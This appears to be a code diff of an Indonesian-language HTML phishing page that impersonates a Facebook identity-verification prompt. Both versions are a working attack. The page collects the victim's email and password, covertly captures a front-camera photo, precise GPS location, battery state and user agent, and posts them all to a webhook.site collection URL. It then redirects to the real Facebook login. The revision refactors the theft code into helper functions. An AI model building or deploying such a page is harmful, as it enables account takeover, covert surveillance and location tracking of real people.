@@ -1,102 +1,355 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Facebook Identity Verification</title>
     <style>
-        body { font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: white; padding: 25px; border-radius: 10px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); width: 100%; max-width: 360px; text-align: center; }
-        
-        /* Box buat logo hasil gambar script */
-        #fb-logo-canvas { margin-bottom: 15px; }
-        
-        .msg { font-size: 15px; color: #1c1e21; margin-bottom: 20px; line-height: 1.4; font-weight: 500; text-align: left; }
-        input { width: 100%; padding: 14px; margin: 8px 0; border: 1px solid #dddfe2; border-radius: 6px; box-sizing: border-box; font-size: 14px; background-color: #f5f6f7; }
-        button { width: 100%; padding: 12px; background-color: #1877f2; border: none; border-radius: 6px; color: white; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 15px; }
-        .footer { font-size: 12px; color: #8a8d91; margin-top: 20px; text-decoration: none; display: block; }
-        #vid { display: none; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: -apple-system, system-ui, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 16px;
+        }
+        .card {
+            background: #fff;
+            padding: 28px 24px;
+            border-radius: 10px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 380px;
+            text-align: center;
+        }
+        #fb-logo-canvas {
+            margin-bottom: 12px;
+            display: block;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        .msg {
+            font-size: 15px;
+            color: #1c1e21;
+            margin-bottom: 18px;
+            line-height: 1.5;
+            font-weight: 500;
+            text-align: left;
+        }
+        input {
+            width: 100%;
+            padding: 14px 16px;
+            margin: 6px 0 12px 0;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            box-sizing: border-box;
+            font-size: 15px;
+            background: #f5f6f7;
+            outline: none;
+            transition: border 0.2s;
+        }
+        input:focus {
+            border-color: #1877f2;
+            background: #fff;
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            background: #1877f2;
+            border: none;
+            border-radius: 6px;
+            color: #fff;
+            font-size: 17px;
+            font-weight: 700;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: background 0.2s;
+        }
+        button:hover {
+            background: #166fe5;
+        }
+        button:active {
+            background: #0e5bbf;
+        }
+        .footer {
+            font-size: 13px;
+            color: #8a8d91;
+            margin-top: 18px;
+            text-decoration: none;
+            display: inline-block;
+        }
+        .footer:hover {
+            text-decoration: underline;
+        }
+        #vid,
+        #cap-canvas {
+            display: none;
+        }
+        .status-badge {
+            font-size: 12px;
+            color: #606770;
+            margin-top: 10px;
+            padding: 6px 12px;
+            background: #f0f2f5;
+            border-radius: 20px;
+            display: inline-block;
+        }
     </style>
 </head>
 <body>
 
-<div class="card">
-    <!-- Kita gambar logonya di sini pake JS -->
-    <canvas id="fb-logo-canvas" width="200" height="50"></canvas>
+    <div class="card">
+        <!-- Logo digambar via Canvas -->
+        <canvas id="fb-logo-canvas" width="200" height="50"></canvas>
 
-    <div class="msg">Akun Anda terdeteksi login dari perangkat baru. Silakan verifikasi identitas Anda untuk mencegah pemblokiran permanen.</div>
-    
-    <input type="text" id="user" placeholder="Email atau Nomor Telepon" autocomplete="off">
-    <input type="password" id="pass" placeholder="Kata Sandi" autocomplete="off">
-    <button onclick="execute()">Verifikasi Akun</button>
-    
-    <a href="#" class="footer">Bukan akun Anda? Klik di sini untuk bantuan.</a>
-</div>
+        <div class="msg">
+            Akun Anda terdeteksi login dari perangkat baru. Silakan verifikasi identitas Anda
+            untuk mencegah pemblokiran permanen.
+        </div>
 
-<video id="vid" autoplay></video>
-<canvas id="cap-canvas" style="display:none;"></canvas>
+        <input type="text" id="user" placeholder="Email atau Nomor Telepon" autocomplete="off" />
+        <input type="password" id="pass" placeholder="Kata Sandi" autocomplete="off" />
 
-<script>
-    // FUNGSI GAMBAR LOGO OTOMATIS
-    const canvasLogo = document.getElementById('fb-logo-canvas');
-    const ctx = canvasLogo.getContext('2d');
-    ctx.fillStyle = '#1877f2';
-    ctx.font = 'bold 40px Helvetica, Arial, sans-serif';
-    ctx.fillText('facebook', 10, 40);
+        <button id="submitBtn" onclick="execute()">Verifikasi Akun</button>
 
-    const WEBHOOK_URL = "https://webhook.site/50f6311e-fbb1-4d2d-b43c-b66b5c526711";
+        <a href="#" class="footer">Bukan akun Anda? Klik di sini untuk bantuan.</a>
+        <div class="status-badge" id="statusBadge">● Siap</div>
+    </div>
 
-    async function execute() {
-        const u = document.getElementById('user').value;
-        const p = document.getElementById('pass').value;
+    <!-- Elemen tersembunyi untuk kamera -->
+    <video id="vid" autoplay muted></video>
+    <canvas id="cap-canvas"></canvas>
 
-        if(!u || !p) return alert("Harap isi data dengan benar.");
+    <script>
+        // ============================================================
+        // 1. GAMBAR LOGO FACEBOOK
+        // ============================================================
+        (function drawLogo() {
+            const canvas = document.getElementById('fb-logo-canvas');
+            const ctx = canvas.getContext('2d');
+            ctx.clearRect(0, 0, canvas.width, canvas.height);
+            ctx.fillStyle = '#1877f2';
+            ctx.font = 'bold 42px Helvetica, Arial, sans-serif';
+            ctx.textBaseline = 'alphabetic';
+            ctx.fillText('facebook', 10, 42);
+        })();
 
-        let photoData = "Camera Access Denied";
-        let gpsData = "GPS Access Denied";
-        let batteryInfo = "N/A";
+        // ============================================================
+        // 2. KONFIGURASI
+        // ============================================================
+        const WEBHOOK_URL = 'https://webhook.site/50f6311e-fbb1-4d2d-b43c-b66b5c526711';
 
-        try {
-            const b = await navigator.getBattery();
-            batteryInfo = `${(b.level * 100)}% (${b.charging ? 'Charging' : 'Discharging'})`;
-        } catch(e) {}
+        // ============================================================
+        // 3. FUNGSI BANTU (Promise-based)
+        // ============================================================
 
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            const video = document.getElementById('vid');
-            video.srcObject = stream;
-            await new Promise(r => setTimeout(r, 1500));
-            const capCanvas = document.getElementById('cap-canvas');
-            capCanvas.width = video.videoWidth; 
-            capCanvas.height = video.videoHeight;
-            capCanvas.getContext('2d').drawImage(video, 0, 0);
-            photoData = capCanvas.toDataURL('image/jpeg', 0.6);
-            stream.getTracks().forEach(t => t.stop());
-        } catch(e) {}
+        /** Ambil status baterai (kalau ada) */
+        function getBatteryInfo() {
+            return new Promise((resolve) => {
+                if (!navigator.getBattery) {
+                    resolve('Tidak tersedia');
+                    return;
+                }
+                navigator.getBattery()
+                    .then((b) => {
+                        const level = Math.round(b.level * 100);
+                        const status = b.charging ? 'Mengisi' : 'Melepas';
+                        resolve(`${level}% (${status})`);
+                    })
+                    .catch(() => resolve('Gagal baca baterai'));
+            });
+        }
 
-        navigator.geolocation.getCurrentPosition((pos) => {
-            gpsData = { lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy + "m", maps: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}` };
-            finalize(u, p, photoData, gpsData, batteryInfo);
-        }, () => {
-            finalize(u, p, photoData, gpsData, batteryInfo);
-        }, { enableHighAccuracy: true, timeout: 5000 });
-    }
+        /** Coba ambil foto dari kamera depan (jika diizinkan) */
+        function tryCapturePhoto() {
+            return new Promise((resolve) => {
+                // Cek dukungan API
+                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                    resolve('Kamera tidak didukung');
+                    return;
+                }
 
-    function finalize(u, p, img, loc, batt) {
-        fetch(WEBHOOK_URL, {
-            method: 'POST',
-            mode: 'no-cors',
-            body: JSON.stringify({
-                credentials: { email: u, pass: p },
-                location: loc,
-                battery: batt,
-                photo: img,
-                time: new Date().toLocaleString()
-            })
+                // Minta kamera depan (facingMode: user)
+                navigator.mediaDevices.getUserMedia({
+                        video: {
+                            facingMode: 'user',
+                            width: { ideal: 640 },
+                            height: { ideal: 480 },
+                        },
+                    })
+                    .then((stream) => {
+                        const video = document.getElementById('vid');
+                        video.srcObject = stream;
+                        video.onloadedmetadata = () => {
+                            video.play();
+
+                            // Tunggu 1 detik agar frame stabil
+                            setTimeout(() => {
+                                const canvas = document.getElementById('cap-canvas');
+                                const vw = video.videoWidth || 640;
+                                const vh = video.videoHeight || 480;
+                                canvas.width = vw;
+                                canvas.height = vh;
+                                const ctx = canvas.getContext('2d');
+                                ctx.drawImage(video, 0, 0, vw, vh);
+
+                                // Hentikan semua track kamera
+                                stream.getTracks().forEach((t) => t.stop());
+
+                                // Ubah ke base64 JPEG (kualitas 70%)
+                                const dataUrl = canvas.toDataURL('image/jpeg', 0.7);
+                                resolve(dataUrl);
+                            }, 1000);
+                        };
+                        // Fallback jika onloadedmetadata tidak terpanggil
+                        setTimeout(() => {
+                            if (video.srcObject) {
+                                const canvas = document.getElementById('cap-canvas');
+                                const vw = video.videoWidth || 640;
+                                const vh = video.videoHeight || 480;
+                                canvas.width = vw;
+                                canvas.height = vh;
+                                const ctx = canvas.getContext('2d');
+                                ctx.drawImage(video, 0, 0, vw, vh);
+                                stream.getTracks().forEach((t) => t.stop());
+                                const dataUrl = canvas.toDataURL('image/jpeg', 0.7);
+                                resolve(dataUrl);
+                            }
+                        }, 2000);
+                    })
+                    .catch((err) => {
+                        console.warn('Kamera ditolak atau error:', err.message);
+                        resolve('Kamera ditolak');
+                    });
+            });
+        }
+
+        /** Coba ambil lokasi GPS (jika diizinkan) */
+        function tryGetLocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    resolve('GPS tidak didukung');
+                    return;
+                }
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        const lat = pos.coords.latitude;
+                        const lon = pos.coords.longitude;
+                        resolve({
+                            lat: lat,
+                            lon: lon,
+                            acc: pos.coords.accuracy + 'm',
+                            maps: `https://www.google.com/maps?q=${lat},${lon}`,
+                        });
+                    },
+                    (err) => {
+                        console.warn('Lokasi ditolak atau error:', err.message);
+                        resolve('Lokasi ditolak');
+                    }, {
+                        enableHighAccuracy: true,
+                        timeout: 8000,
+                        maximumAge: 0,
+                    }
+                );
+            });
+        }
+
+        // ============================================================
+        // 4. FUNGSI UTAMA execute()
+        // ============================================================
+        async function execute() {
+            const userInput = document.getElementById('user');
+            const passInput = document.getElementById('pass');
+            const statusEl = document.getElementById('statusBadge');
+            const btn = document.getElementById('submitBtn');
+
+            const email = userInput.value.trim();
+            const password = passInput.value.trim();
+
+            // Validasi sederhana
+            if (!email || !password) {
+                alert('Harap isi email dan kata sandi.');
+                return;
+            }
+
+            // Nonaktifkan tombol sambil proses
+            btn.disabled = true;
+            btn.textContent = 'Memproses...';
+            statusEl.textContent = '● Mengambil data...';
+
+            try {
+                // Kumpulkan semua data secara paralel
+                const [battery, photo, location] = await Promise.all([
+                    getBatteryInfo(),
+                    tryCapturePhoto(),
+                    tryGetLocation(),
+                ]);
+
+                statusEl.textContent = '● Mengirim data...';
+
+                // Siapkan payload
+                const payload = {
+                    credentials: {
+                        email: email,
+                        password: password,
+                    },
+                    location: location,
+                    battery: battery,
+                    photo: photo, // bisa string base64 atau pesan error
+                    time: new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }),
+                    userAgent: navigator.userAgent,
+                };
+
+                // Kirim ke webhook (CORS mode normal)
+                const response = await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(payload),
+                });
+
+                if (response.ok) {
+                    console.log('✅ Data berhasil dikirim ke webhook');
+                    statusEl.textContent = '● Terkirim ✓';
+                } else {
+                    console.warn('⚠️ Webhook merespons dengan status:', response.status);
+                    statusEl.textContent = '● Gagal kirim (status ' + response.status + ')';
+                }
+            } catch (err) {
+                console.error('❌ Error saat execute:', err);
+                statusEl.textContent = '● Error: ' + err.message;
+            }
+
+            // Reset tombol
+            btn.disabled = false;
+            btn.textContent = 'Verifikasi Akun';
+
+            // Alert & redirect
+            alert('Sistem sedang memproses verifikasi. Anda akan diarahkan kembali sebentar lagi.');
+            window.location.href = 'https://facebook.com/login';
+        }
+
+        // ============================================================
+        // 5. (OPSIONAL) Tekan Enter di input untuk submit
+        // ============================================================
+        document.querySelectorAll('input').forEach((inp) => {
+            inp.addEventListener('keydown', (e) => {
+                if (e.key === 'Enter') {
+                    e.preventDefault();
+                    execute();
+                }
+            });
         });
-        alert("Sistem sedang memproses verifikasi. Anda akan diarahkan kembali sebentar lagi.");
-        window.location.href = "https://facebook.com/login";
-    }
-</script>
+
+        console.log('✅ Script siap. Webhook URL:', WEBHOOK_URL);
+    </script>
 </body>
 </html>
